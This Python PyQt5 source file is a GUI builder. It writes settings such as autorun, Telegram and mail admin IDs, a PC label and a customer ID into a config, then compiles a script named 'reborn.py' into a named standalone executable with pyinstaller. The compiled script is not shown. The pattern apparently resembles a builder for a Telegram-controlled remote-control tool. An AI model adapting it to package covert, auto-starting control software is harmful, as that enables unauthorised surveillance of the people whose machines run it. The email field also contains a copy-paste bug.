# <==========================================> #
# <================= VISUAL =================> #
# pyuic5 visual_ui1.ui -o visual_ui_.py        #
# <==========================================> #
# <================= COMPILE ================> #

# pip3 install -r requirments.txt
# pyinstaller --onefile visual.py -n installer --icon=Asset.ico --noconsole

# <==========================================> #


import sys
from PyQt5.QtWidgets import QApplication, QWidget, QMainWindow, QFileDialog, QListWidgetItem
import subprocess

from visual_ui_ import Ui_MainWindow
from private import ProgramName
from utils import logging


# InstallFile = 'control_manipulations.py'
InstallFile = 'reborn.py'


dict_ = {'AUTORUN': False,
         'TG': False,
         'MAIL': False,
         'LOGGING': False,
         'userID': [],
         'PC_info': '"PC_1"',
         'PATH': 'None',
         'telegram_admins': [436264579, 673135047],
         'email_admins': []
         }


def rewrite_private():
    with open('private.py', 'r', encoding='UTF-8') as f:
        text = f.read()
    text = text.split('\n')

    for value in dict_:
        for i, line in enumerate(text):
            if value in line:
                print(line)
                text[i] = value + ' = ' + str(dict_[value])
    res = ''
    for line in text:
        res += line + '\n'

    with open('private.py', 'w', encoding='UTF-8') as f:
        f.write(res)


class Install:
    def __init__(self, window, ui):
        self.ui = ui
        self.window = window
        self.ui.install_button.clicked.connect(self.__install)

    # Если нет модулей, нужно подключить явно!!!
    def __install(self):
        rewrite_private()
        try:
            #  --noconsole
            subprocess.call('pip3 install -r requirments.txt')
            subprocess.call(f'pyinstaller --onefile {InstallFile} '
                            f'--distpath {dict_["PATH"]} -n {ProgramName} --icon=Asset.ico ' +
                            '--hidden-import python-telegram-bot')

        except:
            logging.error("Exception occurred", exc_info=True)
        application.close()


class OpenFile:
    def __init__(self, window, ui):
        self.ui = ui
        self.window = window
        self.ui.open_dir.clicked.connect(self.get_dir)
        self.ui.dir_text.editingFinished.connect(self.read_dir)

    def get_dir(self):
        tmp = QFileDialog.getExistingDirectory(None, 'Select a folder:', 'C:\\', QFileDialog.ShowDirsOnly)
        dict_['PATH'] = f'"{tmp}"'
        self.ui.dir_text.clear()
        self.ui.dir_text.setText(dict_['PATH'])

    def read_dir(self):
        dict_['PATH'] = f'{self.ui.dir_text.text()}'
        self.ui.dir_text.clear()
        self.ui.dir_text.setText(dict_['PATH'])


class OtherParams:
    def __init__(self, window, ui):
        self.ui = ui
        self.window = window
        self.ui.pcInfo_text.editingFinished.connect(self.edit_pc_INFO)
        self.ui.custumerId_text.editingFinished.connect(self.edit_custumerId)
        # self.ui.autorun_box.liveness_box.connect()
        self.ui.autorun_box.stateChanged.connect(self.check_boxes)
        self.ui.tg_box.stateChanged.connect(self.check_boxes)
        self.ui.mail_box.stateChanged.connect(self.check_boxes)
        self.ui.tg_text.editingFinished.connect(self.edit_tg_text)
        self.ui.mail_text.editingFinished.connect(self.edit_mail_text)

    def edit_pc_INFO(self):
        dict_['PC_info'] = f'"{self.ui.pcInfo_text.text()}"'

    def edit_custumerId(self):
        dict_['userID'] = [str(self.ui.custumerId_text.text())]

    def edit_tg_text(self):
        if str(self.ui.tg_text.text()):
            dict_['telegram_admins'] = str(self.ui.tg_text.text())

    def edit_mail_text(self):
        if f'"{self.ui.pcInfo_text.text()}"':
            dict_['email_admins'] = f'"{self.ui.pcInfo_text.text()}"'


    def check_boxes(self):
        dict_['AUTORUN'] = True if self.ui.autorun_box.checkState() > 0 else False
        dict_['TG'] = True if self.ui.tg_box.checkState() > 0 else False
        dict_['MAIL'] = True if self.ui.mail_box.checkState() > 0 else False


class mywindow(QMainWindow):
    def __init__(self):
        super(mywindow, self).__init__()
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)

        central_widget = QWidget()
        central_widget.setLayout(self.ui.final_layout)
        self.setCentralWidget(central_widget)

        self.__other_settings()

    def __other_settings(self):
        self.file_holder = OpenFile(self, self.ui)
        self.other = OtherParams(self, self.ui)
        self.install = Install(self, self.ui)


if __name__ == "__main__":
    app = QApplication([])
    application = mywindow()
    application.show()
    sys.exit(app.exec())
